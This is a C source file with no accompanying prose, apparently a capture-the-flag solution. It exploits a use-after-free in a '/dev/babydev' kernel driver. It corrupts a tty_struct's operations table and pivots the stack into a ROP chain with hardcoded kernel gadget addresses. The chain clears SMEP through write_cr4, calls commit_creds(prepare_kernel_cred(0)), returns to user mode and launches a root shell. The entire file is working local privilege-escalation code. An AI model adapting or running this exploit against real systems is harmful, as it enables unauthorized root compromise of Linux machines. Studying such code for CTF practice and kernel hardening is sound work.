#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<fcntl.h>
#include<sys/wait.h>
#include<sys/types.h>
#include<stdint.h>
#include<sys/stat.h>
#include<sys/mman.h>

struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
	long (*compat_ioctl)(struct tty_struct *tty,
			     unsigned int cmd, unsigned long arg);
	void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
	void (*throttle)(struct tty_struct * tty);
	void (*unthrottle)(struct tty_struct * tty);
	void (*stop)(struct tty_struct *tty);
	void (*start)(struct tty_struct *tty);
	void (*hangup)(struct tty_struct *tty);
	int (*break_ctl)(struct tty_struct *tty, int state);
	void (*flush_buffer)(struct tty_struct *tty);
	void (*set_ldisc)(struct tty_struct *tty);
	void (*wait_until_sent)(struct tty_struct *tty, int timeout);
	void (*send_xchar)(struct tty_struct *tty, char ch);
	int (*tiocmget)(struct tty_struct *tty);
	int (*tiocmset)(struct tty_struct *tty,
			unsigned int set, unsigned int clear);
	int (*resize)(struct tty_struct *tty, struct winsize *ws);
	int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
	int (*get_icount)(struct tty_struct *tty,
				struct serial_icounter_struct *icount);
#ifdef CONFIG_CONSOLE_POLL
	int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
	const struct file_operations *proc_fops;
};

unsigned long user_cs, user_ss,user_eflags,user_sp;
void save_stats()
{
	asm volatile(
	"movq %%cs, %0\n"
	"movq %%ss, %1\n"
	"movq %%rsp, %3\n"
	"pushfq\n"
	"popq %2\n"
	:"=r"(user_cs),"=r"(user_ss),"=r"(user_eflags),"=r"(user_sp)
	:
	);
}
void get_shell(void)
{
	printf("[+] get root!\n");
	system("/bin/sh\0");
}
#define KERNCALL __attribute__((regparm(3)))
void (*commit_creds)(void*) KERNCALL;
void* (*prepare_kernel_cred)(void* ) KERNCALL;

size_t swapgs = 0xffffffff81063694;
size_t xchg_esp_eax = 0xFFFFFFFF81007808;//0xffffffff8100008a;
size_t iretq  = 0xffffffff814e35ef;
size_t p_rdi  = 0xffffffff810d238d;
size_t write_cr4 = 0xFFFFFFFF810635B0;

void payload()
{
	commit_creds= 0xffffffff810a1420;
	prepare_kernel_cred =0xffffffff810a1810;
	commit_creds(prepare_kernel_cred(0));
}
int main()
{
	unsigned long long rop[0x30];
	struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));
	printf("[+] fake_tty_operations->ioctl before\n");
	fake_tty_operations->ioctl = xchg_esp_eax; 
	printf("[+] fake_tty_operations->ioctl\n");
	memset(rop,0,sizeof(rop));
	save_stats();
	printf("[+] save_stats\n");
	mmap(xchg_esp_eax&0xfffff000,0x2000,7,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
	rop[0] = p_rdi;	
	rop[1] = 0x6f0;
	rop[2] = write_cr4;
	rop[3] = payload;
	rop[4] = swapgs;
	rop[5] = 0xdeadbeef;
	rop[6] = iretq;
	rop[7] = get_shell;
	rop[8] = user_cs;
	rop[9] = user_eflags;
	rop[10] = user_sp;
	rop[11] = user_ss;
	rop[12] = 0;
	memcpy(xchg_esp_eax&0xffffffff,rop,sizeof(rop));
	printf("[+] stack pivot address:0x%llx\n",xchg_esp_eax&0xffffffff);
	int fd1 = open("/dev/babydev",O_RDWR);
	int fd2 = open("/dev/babydev",O_RDWR);
	ioctl(fd1,0x10001,0x2e0);
	close(fd1);
	/*
	int fd3[0x100];
	for(int i = 0;i<0xff;i++)
	{
		fd3[i] = open("/dev/ptmx",O_RDWR|O_NOCTTY);
		if(fd3[i] < 0)
		{
			printf("fd3[%d] open failure!\n");
			exit(-1);
		}
	}
	*/
	int fd3 = open("/dev/ptmx",O_RDWR|O_NOCTTY);
	//open("/dev/ptmx",O_RDWR|O_NOCTTY);
	unsigned long fake_tty[4] = {0};
	read(fd2,fake_tty,0x18);
	fake_tty[3] = fake_tty_operations;
	write(fd2,fake_tty,0x20);	
	printf("[+] UAF\n");
	//close(fd2);	
	ioctl(fd3,0,0);
	/*
	for(int i=0;i<0xff;i++)
	{
		ioctl(fd3[i],0,0);
	}
	*/
	//close(fd3);
	
	return 0;
}
